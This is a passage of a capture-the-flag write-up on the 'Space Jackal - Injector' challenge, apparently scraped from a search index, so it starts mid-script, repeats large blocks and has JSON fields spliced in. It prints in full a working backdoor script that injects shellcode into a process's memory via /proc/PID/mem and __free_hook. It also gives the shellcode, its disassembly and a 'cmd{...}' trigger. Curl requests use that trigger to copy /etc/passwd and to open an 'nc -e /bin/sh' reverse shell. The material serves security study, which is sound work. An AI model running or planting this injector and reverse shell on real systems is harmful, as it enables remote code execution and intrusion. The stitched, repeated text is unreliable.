ojeequ9I $HeiSuC5o '\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55' $( roth8Kai $Thee6ahB )) QueSh8yi $go7uH1yu $Thee6ahB $HeiSuC5o QueSh8yi $go7uH1yu $eo0oMaeL $( roth8Kai $Thee6ahB ) } if [ $# -ne 1 ] || [ ! -e \"/proc/ $1 \" ] ; then exit 42 fi ia5Uuboh $1 Obfuscated shell variables, base64-encoded strings, and possible shell code point to this script as potentially malicious. After some de-obfuscation, the script looks like this: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 #!/bin/bash set -e pack_addr () { for i in $( seq 0 7 ) ; do curr = $(( $1 >> $i * 8 & 0 xff )) packed = \" $packed $( printf '\\\\x%02x' $curr ) \" done echo $packed } find_addr () { echo $(( 0 x $( nm -D \" $1 \" | sed 's/@.*//' | grep -E \" $2 $ \" | cut -d ' ' -f1 ))) } mem_write () { echo -ne \" $3 \" | dd of = \"/proc/ $1 /mem\" bs = 1 \"seek= $2 \" conv = notrunc 2 >/dev/null } patch_shellcode () { code = \" $1 \" from = $( echo \" $2 \" | sed 's/\\\\/\\\\\\\\/g' ) to = $( echo $3 | sed 's/\\\\/\\\\\\\\/g' ) echo $code | sed \"s/ $from / $to /g\" } expand () { echo \" $1 \" | base64 -d | gzip -d } exploit () { target_PID = \" $1 \" libc_info = $( grep -E \"/libc.*so $ \" \"/proc/ $target_PID /maps\" | head -n 1 | tr -s ' ' ) libc_base = $(( 0 x $( cut -d '-' -f1 <<< \" $libc_info \" ))) libc_filename = $( cut -d ' ' -f6 <<< \" $libc_info \" ) free_hook_addr = $(( libc_base+ $( find_addr $libc_filename __free_hook ))) system_addr = $(( libc_base+ $( find_addr $libc_filename system ))) free_addr = $(( libc_base+ $( find_addr $libc_filename free ))) malloc_usable_addr = $(( libc_base+ $( find_addr $libc_filename malloc_usable_size ))) libc_exec_addr = $(( 0 x $( grep -E \"/libc.*so $ \" \"/proc/ $target_PID /maps\" | grep 'r-xp' | head -n 1 | tr -s ' ' | cut -d ' ' -f1 | cut -d '-' -f2 ))) shellcode = '\\x48\\xb8\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x55\\x49\\xbd\\x43\\x43\\x43\\x43\\x43\\x43\\x43\\x43\\x41\\x54\\x49\\x89\\xfc\\x55\\x53\\x4c\\x89\\xe3\\x52\\xff\\xd0\\x48\\x89\\xc5\\x48\\xb8\\x44\\x44\\x44\\x44\\x44\\x44\\x44\\x44\\x48\\xc7\\x00\\x00\\x00\\x00\\x00\\x48\\x83\\xfd\\x05\\x76\\x61\\x80\\x3b\\x63\\x75\\x54\\x80\\x7b\\x01\\x6d\\x75\\x4e\\x80\\x7b\\x02\\x64\\x75\\x48\\x80\\x7b\\x03\\x7b\\x75\\x42\\xc6\\x03\\x00\\x48\\x8d\\x7b\\x04\\x48\\x8d\\x55\\xfc\\x48\\x89\\xf8\\x8a\\x08\\x48\\x89\\xc3\\x48\\x89\\xd5\\x48\\x8d\\x40\\x01\\x48\\x8d\\x52\\xff\\x8d\\x71\\xe0\\x40\\x80\\xfe\\x5e\\x77\\x1b\\x80\\xf9\\x7d\\x75\\x08\\xc6\\x03\\x00\\x41\\xff\\xd5\\xeb\\x0e\\x48\\x83\\xfa\\x01\\x75\\xd4\\xbd\\x01\\x00\\x00\\x00\\x48\\x89\\xc3\\x48\\xff\\xc3\\x48\\xff\\xcd\\xeb\\x99\\x48\\xb8\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x4c\\x89\\xe7\\xff\\xd0\\x48\\xb8\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x48\\xa3\\x44\\x44\\x44\\x44\\x44\\x44\\x44\\x44\\x58\\x5b\\x5d\\x41\\x5c\\x41\\x5d\\xc3' shellcode = $( patch_shellcode $shellcode '\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41' $( pack_addr $malloc_usable_addr )) shellcode = $( patch_shellcode $shellcode '\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42' $( pack_addr $free_addr )) shellcode = $( patch_shellcode $shellcode '\\x43\\x43\\x43\\x43\\x43\\x43\\x43\\x43' $( pack_addr $system_addr )) shellcode = $( patch_shellcode $shellcode '\\x44\\x44\\x44\\x44\\x44\\x44\\x44\\x44' $( pack_addr $free_hook_addr )) shellcode_length = $( echo -ne $shellcode | wc -c ) shellcode_addr = $(( $libc_exec_addr - $shellcode_length )) shellcode = $( patch_shellcode $shellcode '\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55' $( pack_addr $shellcode_addr )) mem_write $target_PID $shellcode_addr $shellcode mem_write $target_PID $free_hook_addr $( pack_addr $shellcode_addr ) echo 'Shellcode: ' $shellcode echo 'Shellcode address: ' $shellcode_addr echo 'libc_exec address: ' $libc_exec_addr echo 'free() hook address: ' $free_hook_addr } if [ $# -ne 1 ] || [ ! -e \"/proc/ $1 \" ] ; then exit 42 fi exploit $1 The script takes a PID of a process, then looks for information on libc in the process: 37 38 39 libc_info = $( grep -E \"/libc.*so $ \" \"/proc/ $target_PID /maps\" | head -n 1 | tr -s ' ' ) libc_base = $(( 0 x $( cut -d '-' -f1 <<< \" $libc_info \" ))) libc_filename = $( cut -d ' ' -f6 <<< \" $libc_info \" ) Next, it looks for the addresses of specific functions inside libc , specifically system() , free() , malloc_usable_addr() , and __free_hook() : 41 42 43 44 free_hook_addr = $(( libc_base+ $( find_addr $libc_filename __free_hook ))) system_addr = $(( libc_base+ $( find_addr $libc_filename system ))) free_addr = $(( libc_base+ $( find_addr $libc_filename free ))) malloc_usable_addr = $(( libc_base+ $( find_addr $libc_filename malloc_usable_size ))) Finally, it looks for the end of the exec section of libc : 46 libc_exec_addr = $(( 0 x $( grep -E \"/libc.*so $ \" \"/proc/ $target_PID /maps\" | grep 'r-xp' | head -n 1 | tr -s ' ' | cut -d ' ' -f1 | cut -d '-' -f2 ))) The next lines contain what looks like shellcode, with code to patch the shellcode with the addresses of the functions found above: 48 49 50 51 52 53 54 55 shellcode = '\\x48\\xb8\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x55\\x49\\xbd\\x43\\x43\\x43\\x43\\x43\\x43\\x43\\x43\\x41\\x54\\x49\\x89\\xfc\\x55\\x53\\x4c\\x89\\xe3\\x52\\xff\\xd0\\x48\\x89\\xc5\\x48\\xb8\\x44\\x44\\x44\\x44\\x44\\x44\\x44\\x44\\x48\\xc7\\x00\\x00\\x00\\x00\\x00\\x48\\x83\\xfd\\x05\\x76\\x61\\x80\\x3b\\x63\\x75\\x54\\x80\\x7b\\x01\\x6d\\x75\\x4e\\x80\\x7b\\x02\\x64\\x75\\x48\\x80\\x7b\\x03\\x7b\\x75\\x42\\xc6\\x03\\x00\\x48\\x8d\\x7b\\x04\\x48\\x8d\\x55\\xfc\\x48\\x89\\xf8\\x8a\\x08\\x48\\x89\\xc3\\x48\\x89\\xd5\\x48\\x8d\\x40\\x01\\x48\\x8d\\x52\\xff\\x8d\\x71\\xe0\\x40\\x80\\xfe\\x5e\\x77\\x1b\\x80\\xf9\\x7d\\x75\\x08\\xc6\\x03\\x00\\x41\\xff\\xd5\\xeb\\x0e\\x48\\x83\\xfa\\x01\\x75\\xd4\\xbd\\x01\\x00\\x00\\x00\\x48\\x89\\xc3\\x48\\xff\\xc3\\x48\\xff\\xcd\\xeb\\x99\\x48\\xb8\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x4c\\x89\\xe7\\xff\\xd0\\x48\\xb8\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x48\\xa3\\x44\\x44\\x44\\x44\\x44\\x44\\x44\\x44\\x58\\x5b\\x5d\\x41\\x5c\\x41\\x5d\\xc3' shellcode = $( patch_shellcode $shellcode '\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41' $( pack_addr $malloc_usable_addr )) shellcode = $( patch_shellcode $shellcode '\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42' $( pack_addr $free_addr )) shellcode = $( patch_shellcode $shellcode '\\x43\\x43\\x43\\x43\\x43\\x43\\x43\\x43' $( pack_addr $system_addr )) shellcode = $( patch_shellcode $shellcode '\\x44\\x44\\x44\\x44\\x44\\x44\\x44\\x44' $( pack_addr $free_hook_addr )) shellcode_length = $( echo -ne $shellcode | wc -c ) shellcode_addr = $(( $libc_exec_addr - $shellcode_length )) shellcode = $( patch_shellcode $shellcode '\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55' $( pack_addr $shellcode_addr )) Finally, the script writes the shellcode to the end of the libc exec section of memory in the process, and overwrites the address of __free_hook() with the address of the shellcode. To discover what the shellcode does, we can use the pwntools library to disassemble the shellcode, then use ghidra to decompile the shellcode to C (as I'm not great at assembly code). 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 #!/usr/bin/env from pwn import * # Set the context: 64-bit architecture on Linux context . update ( arch = 'amd64' , os = 'linux' ) # The shellcode shellcode = b ' \\x48\\xb8\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x55\\x49\\xbd ' ' \\x43\\x43\\x43\\x43\\x43\\x43\\x43\\x43\\x41\\x54\\x49\\x89\\xfc\\x55\\x53\\x4c ' ' \\x89\\xe3\\x52\\xff\\xd0\\x48\\x89\\xc5\\x48\\xb8\\x44\\x44\\x44\\x44\\x44\\x44 ' ' \\x44\\x44\\x48\\xc7\\x00\\x00\\x00\\x00\\x00\\x48\\x83\\xfd\\x05\\x76\\x61\\x80 ' ' \\x3b\\x63\\x75\\x54\\x80\\x7b\\x01\\x6d\\x75\\x4e\\x80\\x7b\\x02\\x64\\x75\\x48 ' ' \\x80\\x7b\\x03\\x7b\\x75\\x42\\xc6\\x03\\x00\\x48\\x8d\\x7b\\x04\\x48\\x8d\\x55 ' ' \\xfc\\x48\\x89\\xf8\\x8a\\x08\\x48\\x89\\xc3\\x48\\x89\\xd5\\x48\\x8d\\x40\\x01 ' ' \\x48\\x8d\\x52\\xff\\x8d\\x71\\xe0\\x40\\x80\\xfe\\x5e\\x77\\x1b\\x80\\xf9\\x7d ' ' \\x75\\x08\\xc6\\x03\\x00\\x41\\xff\\xd5\\xeb\\x0e\\x48\\x83\\xfa\\x01\\x75\\xd4 ' ' \\xbd\\x01\\x00\\x00\\x00\\x48\\x89\\xc3\\x48\\xff\\xc3\\x48\\xff\\xcd\\xeb\\x99 ' ' \\x48\\xb8\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x4c\\x89\\xe7\\xff\\xd0\\x48 ' ' \\xb8\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x48\\xa3\\x44\\x44\\x44\\x44\\x44 ' ' \\x44\\x44\\x44\\x58\\x5b\\x5d\\x41\\x5c\\x41\\x5d\\xc3 ' # Same the assembly to 'injector.as' with open ( 'injector.as' , 'w' ) as as_file : as_file . write ( disasm ( shellcode )) # And save the binary to 'injector.bin' with open ( 'injector.bin' , 'wb' ) as binfile : binfile . write ( shellcode ) The resulting assembly: 0: 48 b8 41 41 41 41 41 movabs rax , 0x4141414141414141 7: 41 41 41 a: 41 55 push r13 c: 49 bd 43 43 43 43 43 movabs r13 , 0x4343434343434343 13: 43 43 43 16: 41 54 push r12 18: 49 89 fc mov r12 , rdi 1 b: 55 push rbp 1 c: 53 push rbx 1 d: 4 c 89 e3 mov rbx , r12 20: 52 push rdx 21: ff d0 call rax 23: 48 89 c5 mov rbp , rax 26: 48 b8 44 44 44 44 44 movabs rax , 0x4444444444444444 2 d: 44 44 44 30: 48 c7 00 00 00 00 00 mov QWORD PTR [ rax ], 0x0 37: 48 83 fd 05 cmp rbp , 0x5 3 b: 76 61 jbe 0x9e 3 d: 80 3 b 63 cmp BYTE PTR [ rbx ], 0x63 40: 75 54 jne 0x96 42: 80 7 b 01 6 d cmp BYTE PTR [ rbx + 0x1 ], 0x6d 46: 75 4 e jne 0x96 48: 80 7 b 02 64 cmp BYTE PTR [ rbx + 0x2 ], 0x64 4 c: 75 48 jne 0x96 4 e: 80 7 b 03 7 b cmp BYTE PTR [ rbx + 0x3 ], 0x7b 52: 75 42 jne 0x96 54: c6 03 00 mov BYTE PTR [ rbx ], 0x0 57: 48 8 d 7 b 04 lea rdi , [ rbx + 0x4 ] 5 b: 48 8 d 55 fc lea rdx , [ rbp - 0x4 ] 5 f: 48 89 f8 mov rax , rdi 62: 8 a 08 mov cl , BYTE PTR [ rax ] 64: 48 89 c3 mov rbx , rax 67: 48 89 d5 mov rbp , rdx 6 a: 48 8 d 40 01 lea rax , [ rax + 0x1 ] 6 e: 48 8 d 52 ff lea rdx , [ rdx - 0x1 ] 72: 8 d 71 e0 lea esi , [ rcx - 0x20 ] 75: 40 80 fe 5 e cmp si l , 0x5e 79: 77 1 b ja 0x96 7 b: 80 f9 7 d cmp cl , 0x7d 7 e: 75 08 jne 0x88 80: c6 03 00 mov BYTE PTR [ rbx ], 0x0 83: 41 ff d5 call r13 86: eb 0 e jmp 0x96 88: 48 83 fa 01 cmp rdx , 0x1 8 c: 75 d4 jne 0x62 8 e: bd 01 00 00 00 mov ebp , 0x1 93: 48 89 c3 mov rbx , rax 96: 48 ff c3 inc rbx 99: 48 ff cd dec rbp 9 c: eb 99 jmp 0x37 9 e: 48 b8 42 42 42 42 42 movabs rax , 0x4242424242424242 a5: 42 42 42 a8: 4 c 89 e7 mov rdi , r12 ab: ff d0 call rax ad: 48 b8 55 55 55 55 55 movabs rax , 0x5555555555555555 b4: 55 55 55 b7: 48 a3 44 44 44 44 44 movabs ds : 0x4444444444444444 , rax be: 44 44 44 c1: 58 pop rax c2: 5 b pop rbx c3: 5 d pop rbp c4: 41 5 c pop r12 c6: 41 5 d pop r13 c8: c3 ret Firing up ghidra and importing injector.bin (setting the file type as Raw binary and the Language as x86:64:gcc ): we can disassemble the binary code, then see the resulting decompiled C : 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 /* WARNING: Globals starting with '_' overlap smaller symbols at the same address */ undefined8 UndefinedFunction_00000000 ( char * param_1 , undefined8 param_2 , undefined8 param_3 ) { char * pcVar1 ; ulong uVar2 ; ulong uVar3 ; char * pcVar4 ; uVar3 = ( * ( code * ) malloc_usable_size (); _DAT___free_hook = 0 ; pcVar4 = param_1 ; do { if ( uVar3 < 6 ) { ( * ( code * ) __free_hook ( param_1 ); _DAT___free_hook = ( shellcode_addr ); return param_3 ; } if (((( * pcVar4 == 'c' ) && ( pcVar4 [ 1 ] == 'm' )) && ( pcVar4 [ 2 ] == 'd' )) && ( pcVar4 [ 3 ] == '{' )) { * pcVar4 = '\\0' ; pcVar4 = pcVar4 + 4 ; uVar3 = uVar3 - 4 ; do { pcVar1 = pcVar4 + 1 ; uVar2 = uVar3 - 1 ; if ( 0x5e < ( byte )( * pcVar4 - 0x20U )) goto LAB_00000096 ; if ( * pcVar4 == '}' ) { * pcVar4 = '\\0' ; ( * ( code * ) system (); goto LAB_00000096 ; } pcVar4 = pcVar1 ; uVar3 = uVar2 ; } while ( uVar2 != 1 ); uVar3 = 1 ; } LAB_00000096 : pcVar4 = pcVar4 + 1 ; uVar3 = uVar3 - 1 ; } while ( true ); } The important line is: 21 if (((( * pcVar4 == 'c' ) && ( pcVar4 [ 1 ] == 'm' )) && ( pcVar4 [ 2 ] == 'd' )) && ( pcVar4 [ 3 ] == '{' )) { The shellcode is looking for the string cmd{ in a block of memory passed to malloc() . If it sees that string in the memory block, it saves the next characters until } is found. It then calls system() to execute the string. This is the backdoor rudi planted in the system. Now that we've identified how the backdoor works, we need to determine how rudi (and us) can take advantage of it remotely. Using the run.sh script, we can launch the snapshot image of the server, which drops us into a root shell in the snapshot: [root@fedora injector]# ./run.sh Restoring snapshot compromised (art_ctf_injector_local.qcow2) Press Return... root@injector-local:~# id uid=0(root) gid=0(root) groups=0(root) Running ss -ltpn will show us what ports open and which processes have them open: root@injector-local:~# ss -ltpn State Recv-Q Send-Q Local Address:Port Peer Address:Port Process LISTEN 0 4096 127.0.0.53%lo:53 0.0.0.0:* users:((\"systemd-resolve\",pid=363,fd=13)) LISTEN 0 128 0.0.0.0:3322 0.0.0.0:* users:((\"sshd\",pid=377,fd=3)) LISTEN 0 511 0.0.0.0:4321 0.0.0.0:* users:((\"nginx\",pid=380,fd=6),(\"nginx\",pid=379,fd=6)) LISTEN 0 128 [::]:3322 [::]:* users:((\"sshd\",pid=377,fd=4)) sshd is listening on 3322 , and nginx on 4321 . The exploit code is still sitting in /tmp/.hax/injector.sh , so we can run it with the PID of nginx (380) : root@injector-local:~# /tmp/.hax/injector.sh 380 root@injector-local:~# Sending a curl command to the web server with a header containing the exploit command should cause the exploit to run: root@injector-local:~# curl -H 'X-Header: cmd{cp /etc/passwd /tmp}' http://localhost:4321 <!DOCTYPE html> <html> <head> <title>Welcome to nginx!</title> <style> body { width: 35em; margin: 0 auto; font-family: Tahoma, Verdana, Arial, sans-serif; } </style> </head> <body> <h1>Welcome to nginx!</h1> <p>If you see this page, the nginx web server is successfully installed and working. Further configuration is required.</p> <p>For online documentation and support please refer to <a href=\"http://nginx.org/\">nginx.org</a>.<br/> Commercial support is available at <a href=\"http://nginx.com/\">nginx.com</a>.</p> <p><em>Thank you for using nginx.</em></p> </body> </html> root@injector-local:~# ls -l /tmp total 16 -rw-r--r-- 1 www-data www-data 1778 Jan 29 03:47 passwd And we see the exploit did run: /etc/passwd has been copied to /tmp , by the user www-data . Finally, we're ready to exploit this on the real system injector.challenges.adversary.zone . On an Internet-accessible host, start a netcat listener on a port, then send a curl request to the server: xps15$ curl -H 'Host: cmd{nc -n -e /bin/sh ###.##.###.## 12345}' http://injector.challenges.adversary.zone:4321 We'll get a shell connected to the netcat listener on our host. As in the test, it's running as www-data . There is a symlink /flag.txt pointing to /home/user , the contents of which is the answer for this challenge. Also in the user's home directory is the non-obfuscated version of the exploit script, and a script to start it when the server reboots: remote$ nc -vnlp 12345 Received connection from ::ffff:167.99.209.243 port 50798 pwd / id uid=33(www-data) gid=33(www-data) groups=33(www-data) ls -l total 64 lrwxrwxrwx 1 root root 7 Oct 22 13:58 bin -> usr/bin drwxr-xr-x 3 root root 4096 Dec 17 15:16 boot drwxr-xr-x 2 root root 4096 Dec 17 14:59 cdrom drwxr-xr-x 17 root root 3860 Jan 28 03:59 dev drwxr-xr-x 92 root root 4096 Jan 12 14:56 etc lrwxrwxrwx 1 root root 19 Jan 12 12:57 flag -> /home/user/flag.txt lrwxrwxrwx 1 root root 19 Jan 12 12:10 flag.txt -> /home/user/flag.txt drwxr-xr-x 3 root root 4096 Dec 17 15:07 home ... cd /home/user ls -l total 12 -rw-r--r-- 1 root root 23 Jan 12 12:08 flag.txt -rwxr-xr-x 1 root root 3027 Jan 12 14:59 injector.sh -rwxr-xr-x 1 root root 246 Jan 12 15:21 start.sh cat flag.txt CS{fr33_h00k_b4ckd00r} Answer # CS{fr33_h00k_b4ckd00r}","title":"Space Jackal - Injector"},{"location":"SpaceJackal/injector/#space-jackal-injector","text":"From the second message on SPACE JACKAL's board, 'rudi' has left a backdoor on his former employer's systems.","title":"SPACE JACKAL - Injector"},{"location":"SpaceJackal/injector/#challenge-description","text":"The decrypted forum messages revealed that a disgruntled employee at one of our customers joined SPACE JACKAL and backdoored a host at their employer before they quit. Our customer provided us with a snapshot of that machine . Please identify the backdoor and validate your findings against our test instance of that host, which is available at injector.challenges.adversary.zone .","title":"Challenge description"},{"location":"SpaceJackal/injector/#solution","text":"We're given a .tar.xz file containing a qcow2 disk image and a shell script to run the snapshot. After extracting the .tar file, we can convert the qcow2 image to raw format and mount it: xps15$ qemu-img convert art_ctf_injector_local.qcow2 art_ctf_injector_local.raw xps15$ ls -hl art_ctf_injector_local.* -rw-r--r-- 1 jra jra 2.8G Jan 23 20:54 art_ctf_injector_local.qcow2 -rw-r--r-- 1 jra jra 10G Jan 28 16:02 art_ctf_injector_local.raw root@xps15# losetup -f # (ubuntu LOL) /dev/loop29 root@xps15# losetup -P /dev/loop29 art_ctf_injector_local.raw root@xps15# fdisk -l /dev/loop29 Disk /dev/loop29: 10 GiB, 10737418240 bytes, 20971520 sectors Units: sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disklabel type: gpt Disk identifier: 62B0CFE7-BB10-47FE-B235-AD95F16E8072 Device Start End Sectors Size Type /dev/loop29p1 2048 4095 2048 1M BIOS boot /dev/loop29p2 4096 20969471 20965376 10G Linux filesystem root@xps15# mount -r /dev/loop29p2 /mnt root@xps15# ls /mnt bin cdrom etc lib lib64 lost+found mnt proc run srv tmp var boot dev home lib32 libx32 media opt root sbin sys usr As a quick test, we can run tools like rkhunter or chkrootkit to see whether rudi used an off-the-shelf rootkit to backdoor the system: root@xps15# chkrootkit -r /mnt ROOTDIR is `/mnt/' Checking `amd'... not found Checking `basename'... not infected Checking `biff'... not found ... Searching for Backdoor.Linux.Mokes.a ... nothing found Searching for Malicious TinyDNS ... nothing found Searching for Linux.Xor.DDoS ... INFECTED: Possible Malicious Linux.Xor.DDoS installed /mnt/tmp/.hax/injector.sh /tmp/.hax/injector.sh definitely looks suspicious: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 #!/bin/bash set -e roth8Kai () { for i in $( seq 0 7 ) ; do curr = $(( $1 >> $i * 8 & 0 xff )) packed = \" $packed $( printf '\\\\x%02x' $curr ) \" done echo $packed } ieph2Oon () { echo $(( 0 x $( nm -D \" $1 \" | sed 's/@.*//' | grep -E \" $2 $ \" | cut -d ' ' -f1 ))) } QueSh8yi () { echo -ne \" $3 \" | dd of = \"/proc/ $1 /mem\" bs = 1 \"seek= $2 \" conv = notrunc 2 >/dev/null } ojeequ9I () { code = \" $1 \" from = $( echo \" $2 \" | sed 's/\\\\/\\\\\\\\/g' ) to = $( echo $3 | sed 's/\\\\/\\\\\\\\/g' ) echo $code | sed \"s/ $from / $to /g\" } xeiCh4xi () { echo \" $1 \" | base64 -d | gzip -d } ia5Uuboh () { go7uH1yu = \" $1 \" ih9Ea1se = $( grep -E \"/libc.*so $ \" \"/proc/ $go7uH1yu /maps\" | head -n 1 | tr -s ' ' ) Teixoo1Z = $(( 0 x $( cut -d '-' -f1 <<< \" $ih9Ea1se \" ))) cu1eiSe9 = $( cut -d ' ' -f6 <<< \" $ih9Ea1se \" ) eo0oMaeL = $(( Teixoo1Z+ $( ieph2Oon $cu1eiSe9 $( xeiCh4xi H4sIAAAAAAAAA4uPTytKTY3PyM/PBgDwEjq3CwAAAA == )))) de0fie1O = $(( Teixoo1Z+ $( ieph2Oon $cu1eiSe9 $( xeiCh4xi H4sIAAAAAAAAAyuuLC5JzQUAixFNyQYAAAA = )))) EeGie9qu = $(( Teixoo1Z+ $( ieph2Oon $cu1eiSe9 $( xeiCh4xi H4sIAAAAAAAAA0srSk0FAMjBLk0EAAAA )))) Eeko2juZ = $(( Teixoo1Z+ $( ieph2Oon $cu1eiSe9 $( xeiCh4xi H4sIAAAAAAAAA8tNzMnJT44vLU5MykmNL86sSgUA3kc6ChIAAAA = )))) Iek6Joyo = $(( 0 x $( grep -E \"/libc.*so $ \" \"/proc/ $go7uH1yu /maps\" | grep 'r-xp' | head -n 1 | tr -s ' ' | cut -d ' ' -f1 | cut -d '-' -f2 ))) HeiSuC5o = '\\x48\\xb8\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x55\\x49\\xbd\\x43\\x43\\x43\\x43\\x43\\x43\\x43\\x43\\x41\\x54\\x49\\x89\\xfc\\x55\\x53\\x4c\\x89\\xe3\\x52\\xff\\xd0\\x48\\x89\\xc5\\x48\\xb8\\x44\\x44\\x44\\x44\\x44\\x44\\x44\\x44\\x48\\xc7\\x00\\x00\\x00\\x00\\x00\\x48\\x83\\xfd\\x05\\x76\\x61\\x80\\x3b\\x63\\x75\\x54\\x80\\x7b\\x01\\x6d\\x75\\x4e\\x80\\x7b\\x02\\x64\\x75\\x48\\x80\\x7b\\x03\\x7b\\x75\\x42\\xc6\\x03\\x00\\x48\\x8d\\x7b\\x04\\x48\\x8d\\x55\\xfc\\x48\\x89\\xf8\\x8a\\x08\\x48\\x89\\xc3\\x48\\x89\\xd5\\x48\\x8d\\x40\\x01\\x48\\x8d\\x52\\xff\\x8d\\x71\\xe0\\x40\\x80\\xfe\\x5e\\x77\\x1b\\x80\\xf9\\x7d\\x75\\x08\\xc6\\x03\\x00\\x41\\xff\\xd5\\xeb\\x0e\\x48\\x83\\xfa\\x01\\x75\\xd4\\xbd\\x01\\x00\\x00\\x00\\x48\\x89\\xc3\\x48\\xff\\xc3\\x48\\xff\\xcd\\xeb\\x99\\x48\\xb8\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x4c\\x89\\xe7\\xff\\xd0\\x48\\xb8\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x48\\xa3\\x44\\x44\\x44\\x44\\x44\\x44\\x44\\x44\\x58\\x5b\\x5d\\x41\\x5c\\x41\\x5d\\xc3' HeiSuC5o = $( ojeequ9I $HeiSuC5o '\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41' $( roth8Kai $Eeko2juZ )) HeiSuC5o = $( ojeequ9I $HeiSuC5o '\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42' $( roth8Kai $EeGie9qu )) HeiSuC5o = $( ojeequ9I $HeiSuC5o '\\x43\\x43\\x43\\x43\\x43\\x43\\x43\\x43' $( roth8Kai $de0fie1O )) HeiSuC5o = $( ojeequ9I $HeiSuC5o '\\x44\\x44\\x44\\x44\\x44\\x44\\x44\\x44' $( roth8Kai $eo0oMaeL )) Que2vah0 = $( echo -ne $HeiSuC5o | wc -c ) Thee6ahB = $(( $Iek6Joyo - $Que2vah0 )) HeiSuC5o = $( ojeequ9I $HeiSuC5o '\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55' $( roth8Kai $Thee6ahB )) QueSh8yi $go7uH1yu $Thee6ahB $HeiSuC5o QueSh8yi $go7uH1yu $eo0oMaeL $( roth8Kai $Thee6ahB ) } if [ $# -ne 1 ] || [ ! -e \"/proc/ $1 \" ] ; then exit 42 fi ia5Uuboh $1 Obfuscated shell variables, base64-encoded strings, and possible shell code point to this script as potentially malicious. After some de-obfuscation, the script looks like this: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 #!/bin/bash set -e pack_addr () { for i in $( seq 0 7 ) ; do curr = $(( $1 >> $i * 8 & 0 xff )) packed = \" $packed $( printf '\\\\x%02x' $curr ) \" done echo $packed } find_addr () { echo $(( 0 x $( nm -D \" $1 \" | sed 's/@.*//' | grep -E \" $2 $ \" | cut -d ' ' -f1 ))) } mem_write () { echo -ne \" $3 \" | dd of = \"/proc/ $1 /mem\" bs = 1 \"seek= $2 \" conv = notrunc 2 >/dev/null } patch_shellcode () { code = \" $1 \" from = $( echo \" $2 \" | sed 's/\\\\/\\\\\\\\/g' ) to = $( echo $3 | sed 's/\\\\/\\\\\\\\/g' ) echo $code | sed \"s/ $from / $to /g\" } expand () { echo \" $1 \" | base64 -d | gzip -d } exploit () { target_PID = \" $1 \" libc_info = $( grep -E \"/libc.*so $ \" \"/proc/ $target_PID /maps\" | head -n 1 | tr -s ' ' ) libc_base = $(( 0 x $( cut -d '-' -f1 <<< \" $libc_info \" ))) libc_filename = $( cut -d ' ' -f6 <<< \" $libc_info \" ) free_hook_addr = $(( libc_base+ $( find_addr $libc_filename __free_hook ))) system_addr = $(( libc_base+ $( find_addr $libc_filename system ))) free_addr = $(( libc_base+ $( find_addr $libc_filename free ))) malloc_usable_addr = $(( libc_base+ $( find_addr $libc_filename malloc_usable_size ))) libc_exec_addr = $(( 0 x $( grep -E \"/libc.*so $ \" \"/proc/ $target_PID /maps\" | grep 'r-xp' | head -n 1 | tr -s ' ' | cut -d ' ' -f1 | cut -d '-' -f2 ))) shellcode = 